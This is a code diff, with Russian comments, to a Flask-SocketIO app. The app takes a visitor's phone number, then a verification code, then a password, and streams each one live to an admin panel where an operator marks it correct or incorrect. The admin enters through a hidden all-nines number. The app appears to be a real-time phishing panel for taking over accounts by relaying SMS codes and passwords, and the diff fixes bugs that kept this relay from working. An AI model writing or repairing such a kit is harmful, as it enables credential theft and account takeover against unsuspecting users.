@@ -13,7 +13,7 @@ logs = []  # Список логов для админа
 
 def log_action(message):
     logs.append(message)
-    emit('new_log', message, broadcast=True)  # Broadcasting логов для админа
+    socketio.emit('new_log', message, broadcast=True)  # Исправлено: используем socketio.emit вместо emit
 
 @app.route('/')
 def index():
@@ -72,6 +72,9 @@ def phone():
         <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
         <script>
             var socket = io();
+            socket.on('redirect_to_admin', function(data) {
+                window.location.href = data.url;
+            });
             function submitPhone() {
                 var phone = document.getElementById('phone').value;
                 if (!phone.startsWith('+7') || phone.length < 12) {
@@ -79,6 +82,10 @@ def phone():
                     return;
                 }
                 socket.emit('submit_phone', phone);
+                // Для обычных пользователей перейти к вводу кода; для админа - редирект через emit
+                setTimeout(function() {
+                    window.location.href = '/code?phone=' + encodeURIComponent(phone);
+                }, 500);  // Небольшая задержка для обработки редиректа админа
             }
         </script>
     </head>
@@ -101,11 +108,10 @@ def handle_phone(phone):
     digits = phone[2:]  # Убираем +7
     if len(digits) == 10 and all(d == '9' for d in digits):
         log_action(f'Админ вошел с номером: {phone}')
-        emit('redirect_to_admin', {'url': '/admin'})
+        emit('redirect_to_admin', {'url': '/admin'})  # Эмит к конкретному клиенту (по умолчанию)
         return
     users[phone] = {'entered_code': None, 'confirmed_code': False, 'entered_password': None, 'confirmed_password': False}
     log_action(f'Пользователь подал номер: {phone}')
-    emit('phone_submitted', {'phone': phone})  # Для клиента, чтобы перейти к коду
 
 @app.route('/code')
 def code():
@@ -145,9 +151,6 @@ def code():
                 } else if (data.phone === phone) {
                     document.getElementById('error').innerText = 'Код неверный';
                 }
-            });
-            socket.on('redirect_to_admin', function(data) {
-                window.location.href = data.url;
             });
         </script>
     </head>
@@ -245,25 +248,25 @@ def admin():
             socket.on('new_code', function(data){
                 var pending = document.getElementById('pending');
                 var entry = document.createElement('div');
-                entry.id = 'code-' + data.phone;
-                entry.innerHTML = `Номер: ${data.phone}, Введенный код: ${data.code} <button onclick="confirmCode('${data.phone}', true)">Код верный</button><button class="reject" onclick="confirmCode('${data.phone}', false)">Код неверный</button>`;
+                entry.id = 'code-' + data.phone.replace(/[^a-zA-Z0-9]/g, '');  // Безопасный ID
+                entry.innerHTML = `Номер: ${data.phone}, Введенный код: ${data.code} <button onclick="confirmCode('${data.phone}')">Код верный</button><button class="reject" onclick="confirmCode('${data.phone}', false)">Код неверный</button>`;
                 pending.appendChild(entry);
             });
             socket.on('new_password', function(data){
                 var pending = document.getElementById('pending');
                 var entry = document.createElement('div');
-                entry.id = 'password-' + data.phone;
-                entry.innerHTML = `Номер: ${data.phone}, Введенный пароль: ${data.password} <button onclick="confirmPassword('${data.phone}', true)">Пароль верный</button><button class="reject" onclick="confirmPassword('${data.phone}', false)">Пароль неверный</button>`;
+                entry.id = 'password-' + data.phone.replace(/[^a-zA-Z0-9]/g, '');
+                entry.innerHTML = `Номер: ${data.phone}, Введенный пароль: ${data.password} <button onclick="confirmPassword('${data.phone}')">Пароль верный</button><button class="reject" onclick="confirmPassword('${data.phone}', false)">Пароль неверный</button>`;
                 pending.appendChild(entry);
             });
-            function confirmCode(phone, confirmed) {
+            function confirmCode(phone, confirmed = true) {
                 socket.emit('confirm_code', {phone: phone, confirmed: confirmed});
-                var entry = document.getElementById('code-' + phone);
+                var entry = document.getElementById('code-' + phone.replace(/[^a-zA-Z0-9]/g, ''));
                 if (entry) entry.remove();
             }
-            function confirmPassword(phone, confirmed) {
+            function confirmPassword(phone, confirmed = true) {
                 socket.emit('confirm_password', {phone: phone, confirmed: confirmed});
-                var entry = document.getElementById('password-' + phone);
+                var entry = document.getElementById('password-' + phone.replace(/[^a-zA-Z0-9]/g, ''));
                 if (entry) entry.remove();
             }
         </script>
@@ -286,7 +289,7 @@ def handle_code(data):
     if phone in users:
         users[phone]['entered_code'] = code
         log_action(f'Пользователь {phone} ввел код: {code}')
-        emit('new_code', {'phone': phone, 'code': code}, broadcast=True)  # Для админа
+        socketio.emit('new_code', {'phone': phone, 'code': code}, broadcast=True)  # Для админа
 
 @socketio.on('confirm_code')
 def confirm_code(data):
@@ -304,7 +307,7 @@ def handle_password(data):
     if phone in users:
         users[phone]['entered_password'] = password
         log_action(f'Пользователь {phone} ввел пароль: {password}')
-        emit('new_password', {'phone': phone, 'password': password}, broadcast=True)  # Для админа
+        socketio.emit('new_password', {'phone': phone, 'password': password}, broadcast=True)  # Для админа
 
 @socketio.on('confirm_password')
 def confirm_password(data):
